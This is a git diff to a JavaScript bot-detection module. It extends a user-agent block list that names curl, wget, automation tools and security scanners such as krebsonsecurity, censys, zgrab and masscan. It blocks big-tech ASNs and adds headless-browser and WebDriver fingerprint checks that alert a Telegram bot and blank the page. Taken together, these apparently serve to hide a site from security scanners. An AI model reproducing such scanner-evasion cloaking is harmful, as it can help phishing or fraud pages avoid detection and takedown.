@@ -2,7 +2,58 @@ import config from '@/utils/config';
 import axios from 'axios';
 import { UAParser } from 'ua-parser-js';
 
-const blockedKeywords = ['bot', 'crawler', 'spider', 'puppeteer', 'selenium', 'http', 'client', 'curl', 'wget', 'python', 'java', 'ruby', 'go', 'scrapy', 'lighthouse', 'censysinspect', 'krebsonsecurity', 'ivre-masscan', 'ahrefs', 'semrush', 'sistrix', 'mailchimp', 'mailgun', 'larbin', 'libwww', 'spinn3r', 'zgrab', 'masscan', 'yandex', 'baidu', 'sogou', 'tweetmeme', 'misting', 'BotPoke'];
+const blockedKeywords = [
+    'bot',
+    'crawler',
+    'spider',
+    'headless',
+    'playwright',
+    'webdriver',
+    'puppeteer',
+    'selenium',
+    'phantomjs',
+    'electron',
+    'http',
+    'client',
+    'curl',
+    'wget',
+    'python',
+    'ruby',
+    'scrapy',
+    'lighthouse',
+    'censysinspect',
+    'krebsonsecurity',
+    'ivre-masscan',
+    'ahrefs',
+    'semrush',
+    'sistrix',
+    'mailchimp',
+    'mailgun',
+    'larbin',
+    'libwww',
+    'spinn3r',
+    'zgrab',
+    'masscan',
+    'yandex',
+    'baidu',
+    'sogou',
+    'tweetmeme',
+    'misting',
+    'BotPoke',
+    'google-read-aloud',
+    'bytespider',
+    'petalbot',
+    'applebot',
+    'duckduckbot',
+    'facebot',
+    'facebookexternalhit',
+    'ia_archiver',
+    'slackbot',
+    'discordbot',
+    'gptbot',
+    'oai-searchbot',
+    'anthropic-ai',
+];
 
 const blockedASNs = [15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075, 214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209, 51396, 147049];
 
@@ -75,6 +126,7 @@ const checkAndBlockBots = async () => {
         try {
             window.location.href = 'about:blank';
         } catch {
+            //
         }
         return { isBlocked: true, reason };
     }
@@ -239,15 +291,158 @@ const checkScreenAnomalies = async () => {
     return { isBot: false };
 };
 
+const DOC_KEY_SUSPICIOUS_RE = /cdc_|webdriver|__fxdriver|__selenium|__driver|playwright|puppeteer|nightmare|phantom/i;
+
+const checkAutomationDomAndWindowLeaks = async () => {
+    try {
+        const docKeys = Object.getOwnPropertyNames(document);
+        const badDocKey = docKeys.find((k) => DOC_KEY_SUSPICIOUS_RE.test(k));
+        if (badDocKey) {
+            const reason = `document leak: ${badDocKey}`;
+            await sendBotTelegram(reason);
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+            return { isBot: true, reason };
+        }
+
+        const winAutomationKeys = [
+            'domAutomation',
+            'domAutomationController',
+            '__playwright_evaluation_script__',
+            '__pw_manual',
+            '__pwInitialize',
+            '__nightmare',
+            'callPhantom',
+            '_phantom',
+            'chromeEMU',
+            'cdc_adoQpoasnfa76evfczl1fl',
+        ];
+        const foundWin = winAutomationKeys.find((k) => k in window);
+        if (foundWin) {
+            const reason = `window automation: ${foundWin}`;
+            await sendBotTelegram(reason);
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+            return { isBot: true, reason };
+        }
+    } catch {
+        //
+    }
+    return { isBot: false };
+};
+
+const checkWebGLSoftwareRenderer = async () => {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) {
+            return { isBot: false };
+        }
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!dbg) {
+            return { isBot: false };
+        }
+        const renderer = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
+        const vendor = String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '').toLowerCase();
+        const markers = ['swiftshader', 'llvmpipe', 'software rasterizer', 'mesa offscreen', 'microsoft basic render driver'];
+        const hit = markers.find((m) => renderer.includes(m) || vendor.includes(m));
+        if (hit) {
+            const reason = `WebGL software/headless: ${hit} (${renderer.slice(0, 120)})`;
+            await sendBotTelegram(reason);
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+            return { isBot: true, reason };
+        }
+    } catch {
+        //
+    }
+    return { isBot: false };
+};
+
+const checkNavigatorFingerprintAnomalies = async () => {
+    const ua = navigator.userAgent || '';
+    if (ua.length < 12) {
+        const reason = `user agent quá ngắn (${ua.length})`;
+        await sendBotTelegram(reason);
+        document.body.innerHTML = '';
+        window.location.href = 'about:blank';
+        return { isBot: true, reason };
+    }
+
+    const maxTouch = navigator.maxTouchPoints;
+    if (typeof maxTouch === 'number' && (maxTouch < 0 || maxTouch > 100)) {
+        const reason = `maxTouchPoints bất thường: ${maxTouch}`;
+        await sendBotTelegram(reason);
+        document.body.innerHTML = '';
+        window.location.href = 'about:blank';
+        return { isBot: true, reason };
+    }
+
+    if (
+        window.self === window.top &&
+        typeof window.outerWidth === 'number' &&
+        typeof window.innerWidth === 'number' &&
+        window.outerWidth === 0 &&
+        window.innerWidth > 400
+    ) {
+        const reason = 'outerWidth=0, innerWidth lớn (headless pattern)';
+        await sendBotTelegram(reason);
+        document.body.innerHTML = '';
+        window.location.href = 'about:blank';
+        return { isBot: true, reason };
+    }
+
+    return { isBot: false };
+};
+
+const checkChromeDriverElementAttr = async () => {
+    try {
+        const html = document.documentElement;
+        if (!html) {
+            return { isBot: false };
+        }
+        if (html.hasAttribute('webdriver') || html.getAttribute('webdriver') === 'true') {
+            const reason = 'thẻ html có attribute webdriver (Selenium/ChromeDriver)';
+            await sendBotTelegram(reason);
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+            return { isBot: true, reason };
+        }
+    } catch {
+        //
+    }
+    return { isBot: false };
+};
+
 const detectBot = async () => {
     const userAgentCheck = await checkAndBlockBots();
     if (userAgentCheck.isBlocked) {
         return { isBot: true, reason: userAgentCheck.reason };
     }
 
+    const fingerprintEarly = await checkNavigatorFingerprintAnomalies();
+    if (fingerprintEarly.isBot) {
+        return { isBot: true, reason: fingerprintEarly.reason };
+    }
+
     const webDriverCheck = await checkAdvancedWebDriverDetection();
     if (webDriverCheck.isBot) {
         return { isBot: true, reason: webDriverCheck.reason };
+    }
+
+    const automationLeaks = await checkAutomationDomAndWindowLeaks();
+    if (automationLeaks.isBot) {
+        return { isBot: true, reason: automationLeaks.reason };
+    }
+
+    const htmlWebdriverAttr = await checkChromeDriverElementAttr();
+    if (htmlWebdriverAttr.isBot) {
+        return { isBot: true, reason: htmlWebdriverAttr.reason };
+    }
+
+    const webglSoft = await checkWebGLSoftwareRenderer();
+    if (webglSoft.isBot) {
+        return { isBot: true, reason: webglSoft.reason };
     }
 
     const navigatorCheck = await checkNavigatorAnomalies();
